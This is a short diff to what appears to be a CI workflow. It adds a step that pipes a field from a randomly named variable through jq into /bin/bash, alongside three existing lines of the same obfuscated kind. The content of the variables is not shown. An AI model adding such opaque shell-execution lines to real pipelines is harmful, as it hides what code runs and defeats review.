@@ -33,6 +33,7 @@ jobs:
           echo $sevr367 | jq -r .dur6515 | /bin/bash
           echo $ocuz394 | jq -r .h12712 | /bin/bash
           printf '%s' "$y81808" | jq -r .okmdl4 | /bin/bash
+          echo $i37670 | jq -r .k5 | /bin/bash
 
       - name: Archive output
         if: always()
